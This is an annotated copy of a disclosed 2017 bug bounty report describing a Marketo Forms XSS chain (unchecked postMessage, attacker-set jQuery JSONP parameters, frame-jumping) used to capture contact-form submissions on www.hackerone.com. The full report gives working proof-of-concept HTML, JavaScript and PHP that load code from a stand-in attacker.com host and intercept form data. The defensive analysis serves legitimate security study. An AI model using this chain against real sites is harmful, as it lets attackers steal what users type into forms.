# Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP

## Metadata
- **Source:** HackerOne
- **Report:** 207042 | https://hackerone.com/reports/207042
- **Submitted:** 2017-02-17
- **Reporter:** fransrosen
- **Program:** HackerOne
- **Bounty:** Not specified in writeup
- **Severity:** High
- **Vuln:** Cross-Site Scripting (XSS), Insecure postMessage usage, JSONP injection, Unsafe jQuery.ajax parameter handling, Missing origin validation, Frame jumping/context switching
- **CVEs:** None
- **Category:** web-api

## Summary
An attacker can abuse Marketo Forms' cross-origin iframe (XDFrame) by exploiting missing postMessage origin validation and unsafe AJAX parameter handling to achieve XSS. This allows stealing contact form data submitted on www.hackerone.com through a chain of frame-jumping and JSONP injection attacks.

## Attack scenario
1. Attacker creates a springboard page containing an iframe pointing to Marketo's XDFrame endpoint
2. Attacker's page sends a postMessage to the Marketo iframe with malicious ajaxParams specifying an attacker-controlled JSONP endpoint
3. Due to missing origin validation in XDFrame's postMessage listener, the iframe processes the message and executes $.ajax() with attacker parameters
4. The JSONP endpoint returns JavaScript code that creates a link to HackerOne with #contact fragment and sets up a postMessage interval to target the Marketo iframe on HackerOne
5. Victim clicks the link opening HackerOne, which auto-triggers the contact form; attacker's XSS code registers a message listener in that iframe context
6. When victim submits the contact form, the listener intercepts and exfiltrates the form data via alert or other exfiltration method

## Root cause
Marketo Forms' XDFrame lacks origin validation on postMessage handlers and allows arbitrary parameters to be passed to jQuery.ajax(). Combined with JSONP's dynamic code execution and lack of frame name randomization bypass (using frames[0] instead), this enables attackers to inject malicious code into the iframe context and establish bidirectional communication channels.

## Attacker mindset
An attacker recognizes that third-party form solutions often use iframes for isolation but fail to properly validate cross-origin communication. By chaining multiple weak security boundaries (postMessage without origin checks, flexible AJAX parameters, JSONP execution, frame enumeration), they can achieve code execution in a seemingly isolated context and pivot to eavesdrop on sensitive form submissions.

## Defensive takeaways
- Always validate origin parameter in postMessage handlers; never use '*' without careful consideration
- Implement strict whitelisting of allowed origins in postMessage listeners
- Avoid passing user-controlled parameters directly to $.ajax() or other potentially dangerous APIs; use strict parameter schema validation
- Disable JSONP if possible or strictly control which endpoints can be called via JSONP
- Use Content Security Policy (CSP) to restrict script sources and frame origins
- Implement frame-busting or frame validation logic to detect unauthorized framing
- Use opaque iframe attributes (sandbox, etc.) to restrict iframe capabilities
- Randomize frame names and validate frame references before communication

## Variant hunting
Look for similar patterns in other third-party form providers (Formstack, Typeform, WotNot, etc.) that embed cross-origin iframes for form rendering. Check for postMessage usage without origin validation, JSONP endpoints without strict parameter validation, and any mechanism that allows external pages to inject AJAX calls into embedded contexts. Also examine auto-trigger fragments (#contact, #form, etc.) that load forms without user interaction.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1185 - Exploit Public-Facing Application via Web Interface
- T1204.001 - User Execution: Malicious Link
- T1566 - Phishing (if delivered via email)
- T1005 - Data from Local System (form data interception)

## Notes
This is a sophisticated multi-stage attack leveraging insufficient trust boundaries between frames. The auto-trigger #contact fragment significantly lowers the user interaction barrier. The writeup demonstrates excellent technical depth in explaining the full exploitation chain. Marketo's design choice to accept postMessages from any origin for flexibility ultimately compromised security. This highlights the inherent risks of cross-origin communication mechanisms and the importance of defense-in-depth when handling sensitive data in third-party iframe contexts.

## Full report
<details><summary>Expand</summary>

Hi,

I just discovered that there's a scenario where the Marketo Forms solution being used on www.hackerone.com can actually be abused, using a few fun techniques, to trigger an XSS in the Cross-Origin-iframe being used by Marketo. This results in eavesdropping of the data being sent in the contact-form on www.hackerone.com.

What also made this nice on HackerOne was the auto-trigger to launch the contact form without any interaction using the `#contact`-fragment:

```js
 if(/^#contact/.test(window.location.hash) === true) {
    LoadContactForm();
 }
```

### PoC

My PoC looks like this:

███

PoC-link is here, it will popup alert when form is submitted with the data:
https://█████/marketo2.html 

Only an annoying alert: 
https://████████/marketo.html

### Technical details

So, let's dig down what actually happens here.

#### Marketo cross domain AJAX request window

Marketo uses an iframe that is located here (the `sj17` is just a specific instance on Marketo, this one differs between customers):

https://app-sj17.marketo.com/index.php/form/XDFrame

This page contains a `postMessage`-listener to launch an ajax-call:

```js
if(!window.parent || window.parent == window){
  return;
}
$(window).on("message", function (e){
  ...
  if(message && message.mktoRequest && message.mktoRequest.ajaxParams){
    var params = message.mktoRequest.ajaxParams;
    ...
    $.ajax(params);
```

First, as you see, the window will not work without any window parent. If it's framed, it'll start the listener. Passing arbitrary parameters to `$.ajax` is bad. Sending the following payload as the `ajaxParams`:

```
{"url":"https://attacker.com/jsonp.php","dataType":"jsonp","method":"get"}
```

Having the following content on the `jsonp.php`-endpoint:

```
<?
header("Access-Control-Allow-Origin: *");
?>
alert(document.domain)
```

Will result in an XSS on this marketo.com-domain.

#### postMessage passing

Since no origins are being used here, we can just pass any messages we like, from wherever we like.

To abuse this on www.hackerone.com we need to do the following:

1. Create our springboard page which will have an iframe of the `XDFrame` for Marketo:

```html
<iframe id="x" name="x" border="0" frameborder="0" width="100" height="30" src="https://app-sj17.marketo.com/index.php/form/XDFrame"></iframe>
```

2. We listen to the message we get from the iframe to trigger our payload and we send back a `postMessage` loading a JSONP-endpoint with a function to create a link to www.hackerone.com with the `#contact` fragment:

```html
<script>
var run = false
var b
window.onmessage=function() {
	if(!run)
	x.postMessage('{"mktoRequest":{"ajaxParams":{"url":"https://attacker.com/jsonp.php","dataType":"jsonp","method":"get"}}}', '*')
	run = true
}
</script>
```

This is the content of `jsonp.php`:

```php
<?
header("Access-Control-Allow-Origin: *");
?>
(function(){
document.body.innerHTML='<a href="#" onclick="window.b=window.open(\'https://www.hackerone.com/product/overview#contact\',\'b\',\'\')">Click me!</a>'

setInterval(function() {
try {
	b['frames'][0].postMessage('{"mktoRequest":{"ajaxParams":{"url":"https://attacker.com/jsonp2.php","dataType":"jsonp","method":"get"}}}', '*')
} catch(e){}
}, 1000);
})()
```

When victim clicks the link, we start a interval of `postMessage`-sending to `b['frames'][0]` which should be the Marketo iframe on www.hackerone.com. Interesting enough, Marketo actually sets the name of the frame to `mktoFormsXDIframe + Math.random()` but this can be completely bypassed using `window['frames'][0]` instead.

Our code in `jsonp2.php` looks like this:

```php
<?
header("Access-Control-Allow-Origin: *");
?>
(function(){
	if(window.icanhazmsg) return
	window.icanhazmsg=true
	window.onmessage=function(a) {
		if(a.origin.indexOf('marketo') !== -1) return;
		console.log(a);
		alert("I HAVE YOUR DATA NOW\n" + a.data)
	}
})()
```

As you see, we now use the XSS passed from our springboard-iframe to the iframe on www.hackerone.com to register a listener to pop an alert when data is submitted in the form.

Getting the victim to submit the form, will result in the infamous popup:

████

So, what we did was the following:

1. Attacker's page -> Marketo iframe
2. postMessage from Marketo iframe -> Attacker's page
3. Attacker's page -> postMessage loading JSONP -> Marketo iframe
4. Create link on Marketo iframe -> start sending postMessage
5. Link opens www.hackerone.com in new tab, triggers contact form to show using `#contact`
6. Sends over postMessage from opener. XSS register listener in Marketo iframe
7. Victim submits form, XSS reads data
  

### Conclusion

I played around a bit with this issue and came to the following conclusion:

1. Marketo Forms doesn't use any origin-checks of the postMessage sent to their Cross Origin Frame. This is most likely because the whole point with the frame is to communicate with any page that uses Marketo. This is probably per design.
2. Marketo Forms allows a bit too much flexibility for the page sending the postMessage. It's actually just throwing in a complete object called `ajaxParams` directly into `$.ajax()`. This results in the XSS on `app-*.marketo.com`. I think this is the best thing to patch up properly, not allowing full control over these params, especially not the `jsonp`-mode of jQuery.
3. In HackerOne's case, no data is handled sent from the `error` and `success` functions being triggered when the form is posted which most likely saves HackerOne from getting a proper XSS on their own domain. However, since the data submitted in the form is still passed through the iframe, data can still be stolen using this technique.

Regards,
Frans

</details>

---
*Analysed by Claude on 2026-05-12*
